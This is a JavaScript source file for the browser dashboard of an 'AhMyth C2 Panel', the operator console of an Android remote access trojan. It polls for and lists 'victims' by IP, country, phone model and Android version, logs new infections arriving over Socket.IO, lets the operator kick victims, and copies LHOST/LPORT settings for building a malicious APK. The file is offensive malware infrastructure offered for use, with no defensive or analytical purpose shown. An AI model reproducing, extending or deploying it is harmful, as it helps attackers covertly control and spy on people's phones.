// AhMyth C2 Panel - Client-side JavaScript
// ═════════════════════════════════════════════════════════════

let socket = null;
let victims = {};
let logs = [];
let serverStats = {
    uptime: 0,
    victimCount: 0
};

// ═════════════════════════════════════════════════════════════
// Initialize
// ═════════════════════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 AhMyth C2 Panel initializing...');
    
    // Setup navigation
    setupNavigation();
    
    // Connect to Socket.IO server
    connectToServer();
    
    // Fetch initial data
    fetchServerStats();
    fetchVictims();
    
    // Update stats every 5 seconds
    setInterval(fetchServerStats, 5000);
    setInterval(fetchVictims, 3000);
    setInterval(updateUptime, 1000);
});

// ═════════════════════════════════════════════════════════════
// Navigation
// ═════════════════════════════════════════════════════════════
function setupNavigation() {
    const navItems = document.querySelectorAll('.nav-item');
    
    navItems.forEach(item => {
        item.addEventListener('click', () => {
            const viewName = item.getAttribute('data-view');
            switchView(viewName);
            
            // Update active nav item
            navItems.forEach(nav => nav.classList.remove('active'));
            item.classList.add('active');
        });
    });
}

function switchView(viewName) {
    const views = document.querySelectorAll('.view');
    views.forEach(view => view.classList.remove('active'));
    
    const targetView = document.getElementById(`${viewName}-view`);
    if (targetView) {
        targetView.classList.add('active');
    }
}

// ═════════════════════════════════════════════════════════════
// Socket.IO Connection
// ═════════════════════════════════════════════════════════════
function connectToServer() {
    const host = window.location.origin;
    
    socket = io(host, {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionAttempts: 10
    });
    
    socket.on('connect', () => {
        console.log('✅ Connected to server');
        updateServerStatus('online');
        addLog('success', 'Connected to AhMyth server');
    });
    
    socket.on('disconnect', () => {
        console.log('❌ Disconnected from server');
        updateServerStatus('offline');
        addLog('error', 'Disconnected from server');
    });
    
    socket.on('error', (error) => {
        console.error('Socket error:', error);
        addLog('error', `Socket error: ${error.message}`);
    });
    
    // Listen for victim events
    socket.on('newVictim', (data) => {
        console.log('🎯 New victim connected:', data);
        addLog('success', `New victim connected: ${data.id}`);
        addActivity(`New connection: ${data.ip} (${data.country})`);
        fetchVictims();
    });
    
    socket.on('victimDisconnected', (data) => {
        console.log('⚠️ Victim disconnected:', data);
        addLog('warning', `Victim disconnected: ${data.id}`);
        addActivity(`Disconnected: ${data.id}`);
        fetchVictims();
    });
}

function updateServerStatus(status) {
    const statusBadge = document.getElementById('serverStatus');
    if (status === 'online') {
        statusBadge.textContent = '● ONLINE';
        statusBadge.className = 'status-badge online';
    } else {
        statusBadge.textContent = '● OFFLINE';
        statusBadge.className = 'status-badge offline';
        statusBadge.style.background = 'rgba(239, 68, 68, 0.2)';
        statusBadge.style.color = '#ef4444';
        statusBadge.style.border = '1px solid #ef4444';
    }
}

// ═════════════════════════════════════════════════════════════
// API Calls
// ═════════════════════════════════════════════════════════════
async function fetchServerStats() {
    try {
        const response = await fetch('/health');
        const data = await response.json();
        
        serverStats.uptime = data.uptime;
        serverStats.victimCount = data.activeVictims || 0;
        
        updateDashboardStats(data);
    } catch (error) {
        console.error('Error fetching stats:', error);
    }
}

async function fetchVictims() {
    try {
        const response = await fetch('/victims');
        const data = await response.json();
        
        victims = data.victims || {};
        updateVictimsList(victims);
        updateVictimCount(Object.keys(victims).length);
    } catch (error) {
        console.error('Error fetching victims:', error);
    }
}

// ═════════════════════════════════════════════════════════════
// UI Updates
// ═════════════════════════════════════════════════════════════
function updateDashboardStats(data) {
    document.getElementById('totalVictims').textContent = data.activeVictims || 0;
    document.getElementById('activeVictims').textContent = data.activeVictims || 0;
    document.getElementById('serverUptime').textContent = formatUptime(data.uptime || 0);
    
    // Count unique countries
    const countries = new Set(Object.values(victims).map(v => v.country));
    document.getElementById('countries').textContent = countries.size;
}

function updateUptime() {
    if (serverStats.uptime > 0) {
        serverStats.uptime += 1;
        const formatted = formatUptime(serverStats.uptime);
        document.getElementById('uptime').textContent = formatted;
    }
}

function formatUptime(seconds) {
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);
    
    if (days > 0) return `${days}d ${hours}h`;
    if (hours > 0) return `${hours}h ${minutes}m`;
    if (minutes > 0) return `${minutes}m ${secs}s`;
    return `${secs}s`;
}

function updateVictimCount(count) {
    document.getElementById('victimCount').textContent = count;
}

function updateVictimsList(victimsData) {
    const tbody = document.getElementById('victimsTableBody');
    
    if (Object.keys(victimsData).length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="7" style="text-align: center; padding: 40px; color: #64748b;">
                    هیچ victim متصلی وجود ندارد
                </td>
            </tr>
        `;
        return;
    }
    
    tbody.innerHTML = '';
    
    Object.entries(victimsData).forEach(([id, victim]) => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td><code>${id.substring(0, 8)}</code></td>
            <td>${victim.ip || 'N/A'}</td>
            <td>${victim.country || 'Unknown'} ${getCountryFlag(victim.country)}</td>
            <td>${victim.manf || 'N/A'} ${victim.model || ''}</td>
            <td>Android ${victim.release || 'N/A'}</td>
            <td>${formatDate(victim.connectedAt)}</td>
            <td>
                <button class="btn btn-primary btn-sm" onclick="viewVictim('${id}')">View</button>
                <button class="btn btn-danger btn-sm" onclick="disconnectVictim('${id}')">Kick</button>
            </td>
        `;
        tbody.appendChild(row);
    });
}

function getCountryFlag(country) {
    const flags = {
        'IR': '🇮🇷',
        'US': '🇺🇸',
        'GB': '🇬🇧',
        'DE': '🇩🇪',
        'FR': '🇫🇷',
        'CN': '🇨🇳'
    };
    return flags[country] || '🌍';
}

function formatDate(dateString) {
    if (!dateString) return 'N/A';
    const date = new Date(dateString);
    return date.toLocaleTimeString('fa-IR');
}

// ═════════════════════════════════════════════════════════════
// Activity Log
// ═════════════════════════════════════════════════════════════
function addActivity(message) {
    const activityLog = document.getElementById('activityLog');
    const time = new Date().toLocaleTimeString('fa-IR');
    
    const activityItem = document.createElement('div');
    activityItem.className = 'activity-item';
    activityItem.innerHTML = `
        <span class="activity-time">${time}</span>
        <span class="activity-text">${message}</span>
    `;
    
    activityLog.insertBefore(activityItem, activityLog.firstChild);
    
    // Keep only last 20 activities
    while (activityLog.children.length > 20) {
        activityLog.removeChild(activityLog.lastChild);
    }
}

// ═════════════════════════════════════════════════════════════
// Logs
// ═════════════════════════════════════════════════════════════
function addLog(type, message) {
    const logsContent = document.getElementById('logsContent');
    const time = new Date().toLocaleTimeString('fa-IR');
    
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `
        <span class="log-time">[${time}]</span>
        <span class="log-message">${message}</span>
    `;
    
    logsContent.insertBefore(logEntry, logsContent.firstChild);
    logs.unshift({ type, message, time });
    
    // Keep only last 100 logs
    if (logs.length > 100) {
        logs = logs.slice(0, 100);
        while (logsContent.children.length > 100) {
            logsContent.removeChild(logsContent.lastChild);
        }
    }
}

function clearLogs() {
    logs = [];
    document.getElementById('logsContent').innerHTML = '<div class="log-entry info"><span class="log-time">[--:--:--]</span><span class="log-message">Logs cleared</span></div>';
}

function refreshLogs() {
    addLog('info', 'Logs refreshed');
}

// ═════════════════════════════════════════════════════════════
// Victim Actions
// ═════════════════════════════════════════════════════════════
function viewVictim(id) {
    alert(`View victim details: ${id}\n\nThis feature will be implemented soon!`);
    addLog('info', `Viewing victim: ${id}`);
}

function disconnectVictim(id) {
    if (confirm(`آیا مطمئن هستید که می‌خواهید victim ${id} را disconnect کنید؟`)) {
        // Send disconnect command to server
        socket.emit('kickVictim', { id });
        addLog('warning', `Kicked victim: ${id}`);
    }
}

// ═════════════════════════════════════════════════════════════
// Settings
// ═════════════════════════════════════════════════════════════
function copyApkConfig() {
    const host = document.getElementById('apkHost').value;
    const port = document.getElementById('apkPort').value;
    const config = `LHOST=${host}\nLPORT=${port}`;
    
    navigator.clipboard.writeText(config).then(() => {
        alert('✅ Configuration copied to clipboard!');
        addLog('info', 'APK config copied to clipboard');
    }).catch(err => {
        console.error('Failed to copy:', err);
        alert('❌ Failed to copy configuration');
    });
}

// Fetch internal port on settings view
fetch('/health').then(r => r.json()).then(data => {
    if (data.port) {
        document.getElementById('internalPort').value = data.port;
    }
});

console.log('✅ AhMyth C2 Panel loaded successfully');
